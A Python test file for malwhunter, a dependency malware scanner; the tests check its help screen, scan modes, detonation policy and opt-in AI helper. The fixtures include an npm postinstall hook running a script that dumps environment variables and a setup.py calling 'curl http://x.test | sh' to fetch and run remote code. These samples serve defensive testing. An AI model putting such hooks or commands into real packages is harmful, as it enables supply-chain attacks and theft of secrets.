"""The first screen a user sees, and the four scan modes it advertises."""
from __future__ import annotations

import json
import shlex
from pathlib import Path

import click
import pytest
from click.testing import CliRunner

from malwhunter import cli
from malwhunter.dossier.model import Dossier
from malwhunter.report.terminal import CI_COMMANDS, LOCAL_COMMANDS


def _text(args) -> str:
    result = CliRunner().invoke(cli.cli, args)
    assert result.exit_code == 0, result.output
    return result.output


@pytest.mark.parametrize("args", [[], ["--help"]])
def test_top_level_help_shows_the_logo_and_both_halves(args):
    out = _text(args)
    assert "█   █  ███  █     █   █" in out  # the MALWHUNTER logo (compact form at 80 columns)
    assert out.index("RUNNING LOCALLY") < out.index("RUNNING IN CI/CD")
    for needle in ("--mode static", "--mode detonate-only", "--mode full", "Delta scan", "Full scan", "--cache-dir"):
        assert needle in out


def test_local_part_has_the_three_modes_in_order():
    out = _text([])
    local = out[out.index("RUNNING LOCALLY"): out.index("RUNNING IN CI/CD")]
    assert local.index("--mode static") < local.index("--mode detonate-only") < local.index("--mode full")


def test_ci_part_has_a_full_scan_and_a_delta_scan():
    ci = _text([])
    ci = ci[ci.index("RUNNING IN CI/CD"):]
    full, delta = ci.index("--mode full"), ci.index("--cache-dir")
    assert full < delta and "--fail-on" in ci
    assert "--ai" not in ci and "--no-ai" not in ci  # AI is off unless asked, so CI needs no flag for it


def test_help_is_plain_text_when_piped():
    assert "\x1b" not in _text([])


def _command_lines() -> list[list[str]]:
    """Each documented command, with its `\\` continuation lines joined, as an argv list."""
    commands = []
    for _what, lines in (*LOCAL_COMMANDS, *CI_COMMANDS):
        joined, current = [], ""
        for line in lines:
            current += " " + line.rstrip("\\ ").strip() if current else line.rstrip("\\ ").strip()
            if not line.rstrip().endswith("\\"):
                joined.append(current)
                current = ""
        commands += [shlex.split(c) for c in joined]
    return commands


def test_every_command_shown_in_help_really_parses():
    """Help that advertises a flag that does not exist is worse than no help."""
    seen = 0
    for argv in _command_lines():
        assert argv[0] == "malwhunter"
        name, rest = argv[1], argv[2:]
        command = cli.cli.commands[name]
        with command.make_context(name, list(rest), resilient_parsing=False):
            seen += 1
    assert seen >= 7


def test_subcommand_help_is_still_the_normal_option_list():
    out = _text(["scan", "--help"])
    assert "--mode" in out and "detonate-only" in out and "--cache-dir" in out and "RUNNING LOCALLY" not in out


def test_mode_choices_are_the_four_documented_ones_and_detonate_is_still_accepted():
    param = next(p for p in cli.cli.commands["scan"].params if p.name == "mode")
    assert list(param.type.choices) == ["static", "detonate-only", "full", "auto"]
    assert param.type.convert("detonate", None, None) == "full"


@pytest.mark.parametrize(
    "mode, expected",
    [("static", "never"), ("detonate-only", "only"), ("full", "always"), ("detonate", "always"), ("auto", "smart"), (None, "smart")],
)
def test_modes_map_to_the_internal_detonation_policy(mode, expected):
    assert cli._resolve_detonate_mode(False, False, mode) == expected


def test_old_flags_still_agree_with_the_new_modes():
    assert cli._resolve_detonate_mode(True, False, None) == "never"
    assert cli._resolve_detonate_mode(False, True, None) == "always"
    with pytest.raises(click.UsageError):
        cli._resolve_detonate_mode(False, True, "detonate-only")
    with pytest.raises(click.UsageError):
        cli._resolve_detonate_mode(True, False, "full")


# ---------- detonate-only really skips static analysis, and never reports a clean it did not earn ----------

def _npm_package(monkeypatch, tmp_path, package_json: dict):
    package_dir = tmp_path / "pkgsrc"
    package_dir.mkdir()
    (package_dir / "package.json").write_text(json.dumps(package_json))
    (package_dir / "steal.js").write_text("const e = JSON.stringify(process.env);\n")
    monkeypatch.setattr(cli, "fetch_tarball", lambda *a, **k: tmp_path / "x.tgz")
    monkeypatch.setattr(cli, "extract_tarball", lambda *a, **k: package_dir)
    monkeypatch.setattr(cli, "fetch_package_reputation", lambda *a, **k: None)


def _analyze(tmp_path, mode):
    return cli._analyze_package(
        "x", "1.0.0", tmp_path, detonate_mode=mode, age_threshold_days=30, downloads_threshold=1000, analyst=None
    )


def test_detonate_only_never_runs_the_static_rules(tmp_path, monkeypatch):
    _npm_package(monkeypatch, tmp_path, {"name": "x", "scripts": {"postinstall": "node steal.js"}})
    monkeypatch.setattr(cli, "run_recon", lambda *a, **k: pytest.fail("static analysis must be skipped"))
    seen = []
    monkeypatch.setattr(
        "malwhunter.chamber.runner.detonate_package",
        lambda *a, **k: seen.append(1) or k["summary"].update({"exit_code": 0}) or [],
    )
    d = _analyze(tmp_path, "only")
    assert seen == [1] and d.detonated and d.signals == [] and d.scan_error is None
    assert "static analysis skipped" in d.detonation_decision_reason


def test_detonate_only_on_a_package_with_no_install_script_is_unscanned_not_clean(tmp_path, monkeypatch):
    _npm_package(monkeypatch, tmp_path, {"name": "x", "scripts": {"test": "jest"}})
    monkeypatch.setattr("malwhunter.chamber.runner.detonate_package", lambda *a, **k: pytest.fail("nothing to run"))
    d = _analyze(tmp_path, "only")
    assert d.to_dict()["verdict"] == "unscanned" and "not observed" in d.scan_error


def test_detonate_only_without_docker_is_unscanned_not_clean(tmp_path, monkeypatch):
    from malwhunter.chamber.runner import DetonationUnavailable

    _npm_package(monkeypatch, tmp_path, {"name": "x", "scripts": {"postinstall": "node steal.js"}})

    def unavailable(*a, **k):
        raise DetonationUnavailable("Docker daemon is not reachable")

    monkeypatch.setattr("malwhunter.chamber.runner.detonate_package", unavailable)
    assert _analyze(tmp_path, "only").to_dict()["verdict"] == "unscanned"


def test_full_mode_still_runs_both_static_and_detonation(tmp_path, monkeypatch):
    _npm_package(monkeypatch, tmp_path, {"name": "x", "scripts": {"postinstall": "node steal.js"}})
    monkeypatch.setattr("malwhunter.chamber.runner.detonate_package", lambda *a, **k: [])
    d = _analyze(tmp_path, "always")
    assert d.detonated and any(s.category == "bulk-env-enumeration" for s in d.signals)


def test_static_mode_still_never_detonates(tmp_path, monkeypatch):
    _npm_package(monkeypatch, tmp_path, {"name": "x", "scripts": {"postinstall": "node steal.js"}})
    monkeypatch.setattr("malwhunter.chamber.runner.detonate_package", lambda *a, **k: pytest.fail("no"))
    d = _analyze(tmp_path, "never")
    assert not d.detonated and any(s.category == "bulk-env-enumeration" for s in d.signals)


def test_detonate_only_for_pypi_skips_static_rules_and_still_detonates(tmp_path, monkeypatch):
    from malwhunter.intake import pypi_registry

    sdist = tmp_path / "rel" / "sdist" / "demo-1.0"
    sdist.mkdir(parents=True)
    (sdist / "setup.py").write_text("import os\nos.system('curl http://x.test | sh')\n")
    pkg = pypi_registry.PyPIPackage(root=tmp_path / "rel", sdist_dir=sdist, wheel_dir=None, wheel_file=None)
    monkeypatch.setattr(cli, "fetch_package", lambda *a, **k: pkg)
    monkeypatch.setattr(cli, "fetch_pypi_reputation", lambda *a, **k: None)
    monkeypatch.setattr(cli, "run_python_recon", lambda *a, **k: pytest.fail("static analysis must be skipped"))
    monkeypatch.setattr("malwhunter.chamber.runner.detonate_pypi_package", lambda *a, summary=None, **k: summary.update({"exit_code": 0}) or [])
    d = cli._analyze_package(
        "demo", "1.0", tmp_path, detonate_mode="only", age_threshold_days=30, downloads_threshold=1000,
        analyst=None, ecosystem="pypi",
    )
    assert d.detonated and d.signals == []


def test_scan_accepts_each_new_mode_end_to_end(tmp_path, monkeypatch):
    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "package.json").write_text(json.dumps({"name": "p"}))
    (proj / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0"}}}))
    modes = []
    monkeypatch.setattr(cli, "_analyze_package", lambda n, v, w, **k: modes.append(k["detonate_mode"]) or Dossier(package=n, version=v))
    for mode in ("static", "detonate-only", "full", "auto", "detonate"):
        result = CliRunner().invoke(cli.cli, ["scan", str(proj), "--mode", mode, "--no-ai", "--format", "json"])
        assert result.exit_code == 0, (mode, result.output)
    assert modes == ["never", "only", "always", "smart", "always"]


def test_no_arguments_exit_code_is_zero():
    assert CliRunner().invoke(cli.cli, []).exit_code == 0


def test_unknown_command_still_errors():
    result = CliRunner().invoke(cli.cli, ["nonsense"])
    assert result.exit_code != 0 and Path("x").name == "x"


# ---------- the logo and the lines under it ----------

def _wide(monkeypatch, columns: int):
    monkeypatch.setenv("COLUMNS", str(columns))
    monkeypatch.delenv("COLORTERM", raising=False)


def test_under_the_logo_come_the_three_pillars_the_version_and_the_tagline(monkeypatch):
    from malwhunter.report.terminal import _version

    _wide(monkeypatch, 80)
    out = _text([])
    lines = out.splitlines()
    pillars = next(i for i, ln in enumerate(lines) if "static analysis" in ln)
    assert "detonation" in lines[pillars] and "verifiable evidence" in lines[pillars]
    assert "AI" not in lines[pillars]  # AI is a side dish, not one of the headline features
    assert lines[pillars].rstrip().endswith(f"v{_version()}")  # the version sits at the right edge
    assert lines[pillars + 1].strip() == "Hunts the malware hiding in your dependencies"  # the tagline right below
    assert max(i for i, ln in enumerate(lines) if "█" in ln) < pillars  # all under the art, none above it


def test_wide_terminals_get_the_big_shadow_logo(monkeypatch):
    _wide(monkeypatch, 120)
    out = _text([])
    assert "███╗   ███╗ █████╗ ██╗" in out and "╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝" in out
    assert "static analysis" in out and "Hunts the malware hiding in your dependencies" in out


def test_narrow_terminals_get_the_compact_logo_and_never_wrap(monkeypatch):
    _wide(monkeypatch, 80)
    out = _text([])
    assert "███╗" not in out and "█   █  ███  █" in out
    assert max(len(ln) for ln in out.splitlines() if "█" in ln) <= 80


def test_big_logo_fits_the_width_it_is_chosen_for(monkeypatch):
    _wide(monkeypatch, 92)
    assert max(len(ln) for ln in _text([]).splitlines() if "█" in ln) <= 92


def test_every_logo_line_has_the_same_width_so_the_art_cannot_shear():
    from malwhunter.report.terminal import _SHADOW

    for letter, rows in _SHADOW.items():
        assert len({len(r) for r in rows}) == 1, letter
    assert len({len("".join(_SHADOW[c][r] for c in "MALWHUNTER")) for r in range(6)}) == 1


def test_gradient_only_with_24_bit_colour_otherwise_plain_cyan(monkeypatch):
    from malwhunter.report.terminal import startup_banner

    monkeypatch.setenv("COLUMNS", "120")
    monkeypatch.setenv("COLORTERM", "truecolor")
    assert "\x1b[38;2;" in startup_banner("t")
    monkeypatch.delenv("COLORTERM")
    banner = startup_banner("t")
    assert "\x1b[38;2;" not in banner and "███╗" in banner


def test_scan_banner_uses_the_same_logo_and_names_the_target(monkeypatch):
    from malwhunter.report.terminal import startup_banner

    _wide(monkeypatch, 120)  # also clears COLORTERM: per-character colour codes would split the art
    banner = startup_banner("/some/project")
    assert "███╗   ███╗" in banner and "scanning" in banner and "/some/project" in banner
    assert "Hunts the malware hiding in your dependencies" in banner


def test_version_falls_back_instead_of_breaking_the_first_screen(monkeypatch):
    import importlib.metadata

    from malwhunter.report.terminal import _version

    def missing(_name):
        raise importlib.metadata.PackageNotFoundError

    monkeypatch.setattr(importlib.metadata, "version", missing)
    assert _version() == "dev"


# ---------- AI is a side dish: off unless you ask for it ----------

def test_ai_is_off_by_default_for_scan_and_inspect():
    for name in ("scan", "inspect"):
        param = next(p for p in cli.cli.commands[name].params if p.name == "ai")
        assert param.default is False, name


def test_default_runs_never_start_the_ai_helper(tmp_path, monkeypatch):
    package_dir = tmp_path / "pkgsrc"
    package_dir.mkdir()
    (package_dir / "package.json").write_text(json.dumps({"name": "x"}))
    (package_dir / "index.js").write_text("module.exports = 1;\n")
    monkeypatch.setattr(cli, "fetch_tarball", lambda *a, **k: tmp_path / "x.tgz")
    monkeypatch.setattr(cli, "extract_tarball", lambda *a, **k: package_dir)
    monkeypatch.setattr(cli, "fetch_package_reputation", lambda *a, **k: None)
    monkeypatch.setattr(cli, "Analyst", lambda *a, **k: pytest.fail("the AI helper must not start unless --ai is given"))
    result = CliRunner().invoke(cli.cli, ["inspect", "x@1.0.0", "--mode", "static", "--format", "json"])
    assert result.exit_code == 0, result.output


def test_no_ai_flag_is_still_accepted_for_old_scripts():
    result = CliRunner().invoke(cli.cli, ["inspect", "--help"])
    assert "--ai / --no-ai" in result.output and "Off by default" in result.output


def test_asking_for_ai_without_the_claude_cli_carries_on_without_it(monkeypatch, capsys):
    import shutil

    monkeypatch.setattr(shutil, "which", lambda _name: None)
    assert cli._select_analyst(True) is None
    assert "--ai needs the `claude` CLI" in capsys.readouterr().err
    assert cli._select_analyst(False) is None


def test_ai_flag_creates_the_helper_only_when_claude_exists(monkeypatch):
    import shutil

    monkeypatch.setattr(shutil, "which", lambda _name: "/usr/bin/claude")
    assert isinstance(cli._select_analyst(True), cli.Analyst)


def test_help_shows_ai_only_as_an_optional_extra():
    out = _text([])
    ai_lines = [ln for ln in out.splitlines() if "AI" in ln or "--ai" in ln]
    assert ai_lines and all("Optional" in ln or "malwhunter scan" in ln or "paste into any AI" in ln for ln in ai_lines)
